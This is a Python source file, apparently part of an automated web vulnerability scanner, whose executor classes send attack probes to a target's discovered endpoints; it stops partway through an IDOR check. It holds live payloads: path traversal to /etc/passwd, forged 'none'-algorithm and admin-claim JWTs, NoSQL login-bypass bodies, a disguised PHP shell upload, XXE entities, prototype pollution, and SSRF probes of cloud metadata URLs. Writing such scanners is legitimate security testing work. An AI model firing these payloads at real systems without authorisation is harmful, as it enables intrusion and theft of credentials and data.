"""
Generic HTTP-based executors for V2 coverage matrix.

Design principle: ALL test targets come from discovered endpoints.
No app-specific paths are hardcoded. Each executor classifies discovered
endpoints by semantic role (auth, data, upload, redirect, etc.) and tests
the appropriate subset. Minimal generic probes (/, /api) are used ONLY
when discovery returned nothing.
"""
from __future__ import annotations

import logging
import re
import time
import urllib.request
import urllib.error
import json
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qs

from core.domain.experiment_v2 import SecurityExperiment
from core.execution.executors.base import ExecutionResult, ExecutionStatus, ExecutorBase

logger = logging.getLogger(__name__)

# ── Semantic endpoint classifiers ──────────────────────────────────────
# Each maps a "role" to keywords that, if found anywhere in the endpoint
# path/URL, indicate the endpoint serves that role.  Executors pick the
# roles they care about.

_ROLE_KEYWORDS: Dict[str, List[str]] = {
    "auth":     ["login", "signin", "sign-in", "auth", "session", "oauth", "token", "sso"],
    "user":     ["user", "account", "profile", "me", "member", "customer", "person", "employee"],
    "admin":    ["admin", "manage", "dashboard", "panel", "control", "backoffice", "staff"],
    "data":     ["api", "rest", "graphql", "v1", "v2", "v3"],
    "upload":   ["upload", "file", "attach", "import", "media", "image", "avatar", "document", "photo"],
    "redirect": ["redirect", "goto", "next", "return", "callback", "continue", "url", "link", "forward"],
    "search":   ["search", "query", "filter", "find", "lookup", "browse", "list"],
    "order":    ["order", "cart", "basket", "checkout", "purchase", "payment", "invoice", "transaction", "buy"],
    "config":   ["config", "setting", "preference", "option", "feature", "flag"],
    "feedback": ["feedback", "comment", "review", "rating", "complain", "ticket", "support", "contact"],
    "xml":      ["xml", "soap", "wsdl", "rss", "feed", "atom", "b2b", "edi", "export"],
}

_ID_PATTERN = re.compile(r'/(\d+)(?:/|$)')
_URL_PARAM_NAMES = {"url", "uri", "link", "src", "source", "dest", "target",
                     "redirect", "redirect_url", "redirect_uri", "return",
                     "return_url", "next", "goto", "to", "callback", "webhook",
                     "fetch", "proxy", "ref", "href", "page", "path", "file",
                     "load", "open", "domain", "host", "site", "img", "image"}


class GenericHTTPExecutor(ExecutorBase):
    """Base for executors that only need a URL to probe."""

    def validate_inputs(self, inputs: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
        return True, None

    def validate_target(self, endpoint: Dict[str, Any], identity: Dict[str, Any]) -> Tuple[bool, Optional[str]]:
        return True, None

    def _probe(self, url: str, method: str = "GET",
               headers: Optional[Dict[str, str]] = None,
               data: Optional[bytes] = None) -> Tuple[int, str, Dict[str, str]]:
        hdrs = headers or {"User-Agent": "AntiGravity-V2/1.0"}
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        try:
            with urllib.request.urlopen(req, timeout=self.timeout_seconds) as resp:
                body = resp.read().decode("utf-8", errors="replace")[:8192]
                return resp.status, body, dict(resp.headers)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", errors="replace")[:8192] if e.fp else ""
            return e.code, body, dict(e.headers)
        except Exception as exc:
            logger.debug("Probe failed for %s: %s", url, exc)
            return 0, "", {}

    def _url_from_experiment(self, experiment: SecurityExperiment) -> str:
        ep = experiment.input_parameters.get("url") or experiment.endpoint_id or ""
        if ep and not ep.startswith("http"):
            ep = f"https://{ep}"
        return ep

    def _base(self, experiment: SecurityExperiment) -> str:
        return self._url_from_experiment(experiment).rstrip("/")

    # ── Discovery helpers ──────────────────────────────────────────────

    def _discovered_endpoints(self, experiment: SecurityExperiment) -> List[str]:
        """All discovered endpoints as path strings."""
        eps = experiment.input_parameters.get("endpoints", [])
        if not isinstance(eps, list):
            return []
        out = []
        for e in eps:
            v = e if isinstance(e, str) else (e.get("url") or e.get("path") or "")
            if v:
                out.append(v)
        return out

    def _endpoints_by_role(self, experiment: SecurityExperiment, *roles: str) -> List[str]:
        """Return discovered endpoints matching any of the given semantic roles."""
        keywords = set()
        for r in roles:
            keywords.update(_ROLE_KEYWORDS.get(r, []))
        if not keywords:
            return []
        discovered = self._discovered_endpoints(experiment)
        return [ep for ep in discovered if any(k in ep.lower() for k in keywords)]

    def _to_paths(self, endpoints: List[str], base: str) -> List[str]:
        """Convert a mix of full URLs and relative paths to relative paths."""
        out = []
        for ep in endpoints:
            if ep.startswith("http"):
                parsed = urlparse(ep)
                path = parsed.path
                if parsed.query:
                    path += "?" + parsed.query
                out.append(path)
            else:
                out.append("/" + ep.lstrip("/"))
        return list(dict.fromkeys(out))  # dedupe, preserve order

    def _all_endpoints_as_paths(self, experiment: SecurityExperiment) -> List[str]:
        """Every discovered endpoint as a relative path (deduped)."""
        base = self._base(experiment)
        return self._to_paths(self._discovered_endpoints(experiment), base)

    def _auth_headers(self, experiment: SecurityExperiment) -> Dict[str, str]:
        headers = {"User-Agent": "AntiGravity-V2/1.0"}
        token = experiment.input_parameters.get("auth_token") or experiment.input_parameters.get("token")
        if token:
            headers["Authorization"] = f"Bearer {token}"
        cookie = experiment.input_parameters.get("cookie")
        if cookie:
            headers["Cookie"] = cookie
        return headers

    def _endpoints_with_url_params(self, experiment: SecurityExperiment) -> List[Tuple[str, str]]:
        """Find discovered endpoints that have query params looking like URLs.
        Returns list of (full_url_template, param_name)."""
        base = self._base(experiment)
        results = []
        for ep in self._discovered_endpoints(experiment):
            full = ep if ep.startswith("http") else f"{base}/{ep.lstrip('/')}"
            parsed = urlparse(full)
            params = parse_qs(parsed.query)
            for pname in params:
                if pname.lower() in _URL_PARAM_NAMES:
                    tmpl = full.split(f"{pname}=")[0] + f"{pname}={{}}"
                    results.append((tmpl, pname))
            # Also check if path segment looks like it takes a URL
            if any(k in parsed.path.lower() for k in ["redirect", "proxy", "fetch", "forward", "goto"]):
                if "?" in full:
                    results.append((full.split("?")[0] + "?url={}", "url"))
                else:
                    results.append((full + "?url={}", "url"))
        return results

    def _endpoints_with_ids(self, experiment: SecurityExperiment) -> List[Tuple[str, str, str]]:
        """Find endpoints containing numeric IDs. Returns (path, original_id, swapped_path)."""
        results = []
        for ep in self._all_endpoints_as_paths(experiment):
            match = _ID_PATTERN.search(ep)
            if match:
                orig_id = match.group(1)
                for new_id in ["1", "2", "3", "0", "99999"]:
                    if new_id != orig_id:
                        swapped = ep.replace(f"/{orig_id}", f"/{new_id}", 1)
                        results.append((ep, orig_id, swapped))
                        break
        return results

    def _json_accepting_endpoints(self, experiment: SecurityExperiment) -> List[str]:
        """Endpoints likely to accept JSON bodies (API/data endpoints)."""
        paths = self._to_paths(
            self._endpoints_by_role(experiment, "data", "user", "config", "feedback", "order"),
            self._base(experiment))
        return paths or ["/api"]

    def _state_changing_endpoints(self, experiment: SecurityExperiment) -> List[str]:
        """Endpoints that likely accept state-changing requests (POST/PUT/DELETE)."""
        return self._to_paths(
            self._endpoints_by_role(experiment, "user", "feedback", "order", "config", "admin"),
            self._base(experiment))


class CORSExecutor(GenericHTTPExecutor):
    """Test for overly permissive CORS on all discovered endpoints."""

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # Test CORS on every discovered endpoint (not just the base URL)
        paths = self._all_endpoints_as_paths(experiment) or ["/"]
        for path in paths[:20]:
            headers = {"User-Agent": "AntiGravity-V2/1.0", "Origin": "https://evil.example.com"}
            status, body, resp_headers = self._probe(f"{base}{path}", headers=headers)
            acao = resp_headers.get("Access-Control-Allow-Origin", "")
            acac = resp_headers.get("Access-Control-Allow-Credentials", "")
            if acao in ("*", "https://evil.example.com", "null"):
                findings.append({
                    "test": "cors_permissive", "path": path,
                    "acao": acao, "acac": acac, "status": status,
                })

        vuln = len(findings) > 0
        evidence = self.collect_evidence({
            "status": status if findings else 0,
            "access_control_allow_origin": findings[0]["acao"] if findings else "",
            "vulnerable": vuln,
            "cors_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class InfoDisclosureExecutor(GenericHTTPExecutor):
    """Check for sensitive info in headers and error responses."""

    SENSITIVE_HEADERS = ("x-powered-by", "server", "x-aspnet-version",
                         "x-aspnetmvc-version", "x-debug")

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        status, body, resp_headers = self._probe(url)
        disclosed = {h: resp_headers[h] for h in resp_headers
                     if h.lower() in self.SENSITIVE_HEADERS}
        evidence = self.collect_evidence({
            "status": status,
            "disclosed_headers": disclosed,
            "body_snippet": body[:512] if status >= 400 else "",
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class GraphQLExecutor(GenericHTTPExecutor):
    """Probe for GraphQL introspection — checks discovered endpoints + common paths."""

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)

        # Check discovered endpoints for graphql-like paths, plus common ones
        gql_paths = self._to_paths(
            self._endpoints_by_role(experiment, "data"), base)
        common = ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"]
        seen = set(gql_paths)
        for c in common:
            if c not in seen:
                gql_paths.append(c)

        query = '{"query": "{ __schema { types { name } } }"}'
        headers = {"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"}
        introspection = False
        best_body = ""
        best_status = 0
        for gp in gql_paths[:10]:
            status, body, _ = self._probe(f"{base}{gp}", method="POST",
                                           headers=headers, data=query.encode())
            if "__schema" in body or '"types"' in body:
                introspection = True
                best_body = body
                best_status = status
                break

        evidence = self.collect_evidence({
            "status": best_status,
            "introspection_enabled": introspection,
            "body_snippet": best_body[:1024],
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class WebSocketExecutor(GenericHTTPExecutor):
    """Check if WebSocket upgrade is available and lacks origin validation."""

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)

        # Try discovered endpoints + common WS paths
        ws_paths = self._all_endpoints_as_paths(experiment)
        common_ws = ["/ws", "/socket", "/socket.io/", "/websocket", "/realtime", "/live"]
        seen = set(ws_paths)
        for c in common_ws:
            if c not in seen:
                ws_paths.append(c)

        headers = {"User-Agent": "AntiGravity-V2/1.0", "Upgrade": "websocket",
                   "Connection": "Upgrade", "Origin": "https://evil.example.com"}
        upgrade_found = False
        for wp in ws_paths[:10]:
            status, body, resp_headers = self._probe(f"{base}{wp}", headers=headers)
            if "upgrade" in resp_headers.get("Connection", "").lower():
                upgrade_found = True
                break

        evidence = self.collect_evidence({
            "status": status,
            "upgrade_in_response": upgrade_found,
            "body_snippet": body[:512],
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class BusinessLogicExecutor(GenericHTTPExecutor):
    """Test for business logic flaws: negative values, duplicate requests,
    workflow bypass, price tampering — on discovered endpoints."""

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []
        auth_hdrs = self._auth_headers(experiment)
        json_hdrs = {**auth_hdrs, "Content-Type": "application/json"}

        # 1. Negative/zero/overflow values on all state-changing endpoints
        state_eps = self._state_changing_endpoints(experiment)
        negative_payloads = [
            {"quantity": -1}, {"amount": -100}, {"price": 0},
            {"count": 999999}, {"total": -0.01}, {"quantity": 0},
        ]
        for ep in state_eps[:15]:
            for payload in negative_payloads:
                status, body, _ = self._probe(
                    f"{base}{ep}", method="POST",
                    headers=json_hdrs, data=json.dumps(payload).encode())
                if status in (200, 201) and len(body) > 5:
                    findings.append({
                        "test": "negative_value", "path": ep,
                        "payload": payload, "status": status,
                        "body_snippet": body[:256],
                    })

        # 2. Race condition — rapid duplicate POST to same endpoint
        for ep in state_eps[:5]:
            responses = []
            for _ in range(5):
                status, body, _ = self._probe(f"{base}{ep}", method="POST",
                    headers=json_hdrs, data=b'{}')
                responses.append({"status": status, "length": len(body)})
            statuses = [r["status"] for r in responses]
            if statuses.count(200) > 1 or statuses.count(201) > 1:
                findings.append({"test": "race_condition", "path": ep,
                                 "responses": responses})

        # 3. Workflow bypass — POST to endpoints that might skip steps
        order_eps = self._to_paths(
            self._endpoints_by_role(experiment, "order"), base)
        for ep in order_eps[:5]:
            status, body, _ = self._probe(f"{base}{ep}", method="POST",
                headers=json_hdrs, data=b'{}')
            if status in (200, 201):
                findings.append({"test": "workflow_bypass", "path": ep, "status": status})

        # 4. Method tampering — try PUT/DELETE on GET-only endpoints
        all_eps = self._all_endpoints_as_paths(experiment)
        for ep in all_eps[:10]:
            for method in ["PUT", "DELETE", "PATCH"]:
                status, body, _ = self._probe(f"{base}{ep}", method=method,
                    headers=json_hdrs, data=json.dumps({"price": 0}).encode())
                if status == 200 and len(body) > 5:
                    findings.append({"test": "method_tampering", "path": ep,
                                     "method": method, "status": status})

        evidence = self.collect_evidence({
            "logic_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class PathTraversalExecutor(GenericHTTPExecutor):
    """Test for directory listing and path traversal on discovered endpoints."""

    LISTING_INDICATORS = ("index of", "directory listing", "<pre>",
                          "parent directory", "[dir]")
    TRAVERSAL_PAYLOADS = [
        "..%2f..%2f..%2fetc/passwd",
        "....//....//....//etc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ]

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # Test every discovered endpoint + base
        paths = self._all_endpoints_as_paths(experiment) or ["/"]
        for path in paths[:15]:
            status, body, _ = self._probe(f"{base}{path}")
            body_lower = body.lower()
            if any(ind in body_lower for ind in self.LISTING_INDICATORS):
                findings.append({"test": "directory_listing", "path": path, "status": status})

            for trav in self.TRAVERSAL_PAYLOADS:
                t_url = f"{base}{path.rstrip('/')}/{trav}"
                t_status, t_body, _ = self._probe(t_url)
                if "root:" in t_body or "[extensions]" in t_body:
                    findings.append({"test": "path_traversal", "path": path,
                                     "payload": trav, "status": t_status,
                                     "body_snippet": t_body[:256]})
                    break

        directory_listing = any(f["test"] == "directory_listing" for f in findings)
        traversal_detected = any(f["test"] == "path_traversal" for f in findings)
        evidence = self.collect_evidence({
            "status": 200, "directory_listing": directory_listing,
            "traversal_detected": traversal_detected,
            "traversal_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class JWTExecutor(GenericHTTPExecutor):
    """Test JWT none-algorithm, key confusion, and claim tampering on
    all discovered auth-required endpoints."""

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        import base64 as b64
        def make_jwt(header_d, payload_d, sig=b""):
            h = b64.urlsafe_b64encode(json.dumps(header_d).encode()).rstrip(b"=").decode()
            p = b64.urlsafe_b64encode(json.dumps(payload_d).encode()).rstrip(b"=").decode()
            s = b64.urlsafe_b64encode(sig).rstrip(b"=").decode()
            return f"{h}.{p}.{s}"

        tokens = {
            "none_alg": make_jwt(
                {"alg": "none", "typ": "JWT"},
                {"sub": "1", "role": "admin", "iat": 1700000000, "exp": 9999999999}),
            "empty_secret": make_jwt(
                {"alg": "HS256", "typ": "JWT"},
                {"sub": "1", "role": "admin", "iat": 1700000000, "exp": 9999999999}),
            "claim_tamper": make_jwt(
                {"alg": "HS256", "typ": "JWT"},
                {"sub": "2", "role": "admin", "isAdmin": True, "iat": 1700000000, "exp": 9999999999}),
        }

        # Test on all auth/user/admin endpoints discovered
        auth_eps = self._to_paths(
            self._endpoints_by_role(experiment, "auth", "user", "admin"), base)
        if not auth_eps:
            auth_eps = ["/api/me", "/api/users", "/admin", "/dashboard", "/api/profile"]

        for token_name, token_val in tokens.items():
            for ep in auth_eps[:15]:
                status, body, _ = self._probe(
                    f"{base}{ep}",
                    headers={"Authorization": f"Bearer {token_val}", "User-Agent": "AntiGravity-V2/1.0"})
                if status == 200 and len(body) > 10:
                    body_lower = body.lower()
                    if any(s in body_lower for s in ['"email"', '"role"', '"id"', '"username"', '"name"', '"admin"']):
                        findings.append({
                            "test": "jwt_bypass", "endpoint": ep,
                            "token_type": token_name,
                            "status": status, "body_snippet": body[:256],
                        })

        evidence = self.collect_evidence({
            "jwt_findings": findings, "findings_count": len(findings),
            "tokens_tested": len(tokens), "endpoints_tested": len(auth_eps),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class NoSQLiExecutor(GenericHTTPExecutor):
    """Test for MongoDB-style NoSQL injection on discovered login/search endpoints."""

    NOSQLI_BODY_PAYLOADS = [
        {"email": {"$ne": ""}, "password": {"$ne": ""}},
        {"email": {"$gt": ""}, "password": {"$gt": ""}},
        {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"email": {"$exists": True}, "password": {"$exists": True}},
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"user": {"$gt": ""}, "pass": {"$gt": ""}},
        {"$where": "this.password.length > 0"},
    ]
    NOSQLI_QS_INJECTIONS = ["[$ne]=", "[$gt]=", "[$regex]=.*", "[$exists]=true"]

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # 1. JSON body injection on auth endpoints
        auth_eps = self._to_paths(
            self._endpoints_by_role(experiment, "auth"), base)
        if not auth_eps:
            auth_eps = ["/login", "/api/login", "/auth/login", "/api/auth"]
        for lp in auth_eps[:8]:
            for payload in self.NOSQLI_BODY_PAYLOADS:
                status, body, _ = self._probe(
                    f"{base}{lp}", method="POST",
                    headers={"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"},
                    data=json.dumps(payload).encode())
                if status == 200 and any(s in body.lower() for s in ['"token"', '"authentication"', "success", '"user"', '"session"']):
                    findings.append({
                        "test": "nosqli_login_bypass", "path": lp,
                        "payload_type": next((k for k in ["$ne", "$gt", "$regex", "$where", "$exists"]
                                              if k in json.dumps(payload)), "other"),
                        "status": status, "body_snippet": body[:256],
                    })
                    break

        # 2. Query-string operator injection on search/data endpoints
        search_eps = self._to_paths(
            self._endpoints_by_role(experiment, "search", "data"), base)
        if not search_eps:
            search_eps = ["/api/search", "/api/users", "/search"]
        for sp in search_eps[:8]:
            for inject in self.NOSQLI_QS_INJECTIONS:
                status, body, _ = self._probe(f"{base}{sp}?q{inject}")
                if status == 200 and len(body) > 50:
                    findings.append({"test": "nosqli_query", "path": sp,
                                     "inject": inject, "status": status})

        evidence = self.collect_evidence({
            "nosqli_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class FileUploadExecutor(GenericHTTPExecutor):
    """Test file upload bypass on discovered upload endpoints."""

    TEST_FILES = [
        ("shell.php.jpg", "image/jpeg", b"<?php echo 'test'; ?>"),
        ("test.xml", "application/xml", b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
        ("test.svg", "image/svg+xml", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
        ("..%2f..%2ftest.txt", "text/plain", b"path traversal test"),
        ("test.pdf%00.jpg", "image/jpeg", b"%PDF-1.4 test"),
        ("test.html", "text/html", b"<script>alert(1)</script>"),
        ("test.jsp", "application/octet-stream", b"<% out.print(1); %>"),
    ]

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        upload_eps = self._to_paths(
            self._endpoints_by_role(experiment, "upload"), base)
        if not upload_eps:
            upload_eps = ["/upload", "/api/upload", "/api/files"]

        for up in upload_eps[:8]:
            for fname, ctype, content in self.TEST_FILES:
                import random, string
                boundary = ''.join(random.choices(string.ascii_letters, k=16))
                body_bytes = (
                    f"--{boundary}\r\n"
                    f'Content-Disposition: form-data; name="file"; filename="{fname}"\r\n'
                    f"Content-Type: {ctype}\r\n\r\n"
                ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
                status, body, _ = self._probe(
                    f"{base}{up}", method="POST",
                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}",
                             "User-Agent": "AntiGravity-V2/1.0"},
                    data=body_bytes)
                if status in (200, 201):
                    findings.append({
                        "test": "file_upload_bypass", "path": up,
                        "filename": fname, "content_type": ctype,
                        "status": status, "body_snippet": body[:256],
                    })

        evidence = self.collect_evidence({
            "upload_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class PrototypePollutionExecutor(GenericHTTPExecutor):
    """Test for __proto__ / constructor.prototype pollution on all JSON-accepting endpoints."""

    POLLUTION_PAYLOADS = [
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"isAdmin": True}}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"verified": True, "active": True}},
    ]

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        json_eps = self._json_accepting_endpoints(experiment)
        for ep in json_eps[:12]:
            for method in ["PUT", "POST"]:
                for payload in self.POLLUTION_PAYLOADS:
                    status, body, _ = self._probe(
                        f"{base}{ep}", method=method,
                        headers={"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0"},
                        data=json.dumps(payload).encode())
                    if status in (200, 201):
                        findings.append({
                            "test": "proto_pollution", "endpoint": ep,
                            "method": method,
                            "payload_key": list(payload.keys())[0],
                            "status": status, "body_snippet": body[:256],
                        })

        evidence = self.collect_evidence({
            "pollution_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class SSRFExecutor(GenericHTTPExecutor):
    """Test for SSRF by injecting internal URLs into every discovered endpoint
    that has a URL-like parameter (url=, redirect=, callback=, src=, etc.)."""

    SSRF_TARGETS = [
        "http://localhost", "http://127.0.0.1",
        "http://[::1]", "http://0x7f000001",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd",
        "http://0177.0.0.1",
    ]

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # 1. Auto-detect endpoints with URL-like params from discovery
        url_params = self._endpoints_with_url_params(experiment)

        # 2. Also test redirect-role endpoints
        redirect_eps = self._endpoints_by_role(experiment, "redirect")
        for ep in redirect_eps:
            path = ep if not ep.startswith("http") else urlparse(ep).path
            if not any(path in tmpl for tmpl, _ in url_params):
                url_params.append((f"{base}{path}?url={{}}", "url"))

        if not url_params:
            # Minimal generic probes if nothing discovered
            url_params = [
                (f"{base}/redirect?url={{}}", "url"),
                (f"{base}/api/proxy?url={{}}", "url"),
            ]

        for tmpl, param in url_params[:15]:
            for target in self.SSRF_TARGETS:
                try:
                    test_url = tmpl.format(target)
                    status, body, resp_headers = self._probe(test_url)
                    location = resp_headers.get("Location", "")
                    if (status == 200 and any(s in body for s in ["root:", "ami-id", "instance-id",
                                                                    "computeMetadata", "localhost"])) or \
                       (target.replace("http://", "") in location):
                        findings.append({
                            "test": "ssrf", "param": param,
                            "template": tmpl, "target": target,
                            "status": status, "body_snippet": body[:256],
                        })
                except Exception:
                    pass

        evidence = self.collect_evidence({
            "ssrf_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class XXEExecutor(GenericHTTPExecutor):
    """Test for XXE on any discovered endpoint that might accept XML."""

    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">%xxe;]><foo>test</foo>',
    ]

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # Test XML/upload/import endpoints + all discovered POST endpoints
        xml_eps = self._to_paths(
            self._endpoints_by_role(experiment, "xml", "upload"), base)
        if not xml_eps:
            xml_eps = self._state_changing_endpoints(experiment) or ["/api"]
        for ep in xml_eps[:10]:
            for payload in self.XXE_PAYLOADS:
                for ctype in ["application/xml", "text/xml"]:
                    status, body, _ = self._probe(
                        f"{base}{ep}", method="POST",
                        headers={"Content-Type": ctype, "User-Agent": "AntiGravity-V2/1.0"},
                        data=payload.encode())
                    if status == 200 and any(s in body for s in ["root:", "daemon:", "127.0.0.1"]):
                        findings.append({
                            "test": "xxe", "endpoint": ep, "content_type": ctype,
                            "status": status, "body_snippet": body[:256],
                        })

        evidence = self.collect_evidence({
            "xxe_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class CSRFExecutor(GenericHTTPExecutor):
    """Test for missing CSRF protections on all discovered state-changing endpoints."""

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # Every state-changing endpoint is a CSRF candidate
        eps = self._state_changing_endpoints(experiment)
        if not eps:
            eps = self._all_endpoints_as_paths(experiment) or ["/api"]
        for path in eps[:20]:
            headers = {"Content-Type": "application/json", "User-Agent": "AntiGravity-V2/1.0",
                       "Origin": "https://evil.example.com"}
            status, body, resp_headers = self._probe(
                f"{base}{path}", method="POST", headers=headers,
                data=json.dumps({"test": "csrf_check"}).encode())
            acao = resp_headers.get("Access-Control-Allow-Origin", "")
            has_csrf = any(h.lower() in ("x-csrf-token", "x-xsrf-token", "csrf-token")
                          for h in resp_headers)
            if status in (200, 201) and not has_csrf:
                findings.append({
                    "test": "csrf_missing", "path": path,
                    "status": status, "cors_acao": acao,
                })

        evidence = self.collect_evidence({
            "csrf_findings": findings, "findings_count": len(findings),
        })
        elapsed = (time.monotonic() - start) * 1000
        return ExecutionResult(status=ExecutionStatus.SUCCESS, evidence=evidence,
                               execution_time_ms=elapsed)


class IDORExecutor(GenericHTTPExecutor):
    """Test for IDOR by auto-detecting endpoints with numeric IDs and swapping them."""

    def execute(self, experiment: SecurityExperiment) -> ExecutionResult:
        url = self._url_from_experiment(experiment)
        if not url:
            return ExecutionResult(status=ExecutionStatus.SCHEMA_ERROR,
                                  error_code="NO_URL", error_message="No URL to probe")
        start = time.monotonic()
        base = self._base(experiment)
        findings = []

        # Auto-generate IDOR tests from ALL endpoints containing numeric IDs
        id_endpoints = self._endpoints_with_ids(experiment)
        for orig_path, orig_id, swapped_path in id_endpoints[:20]:
            status, body, _ = self._probe(f"{base}{swapped_path}",
                                           headers=self._auth_headers(experiment))
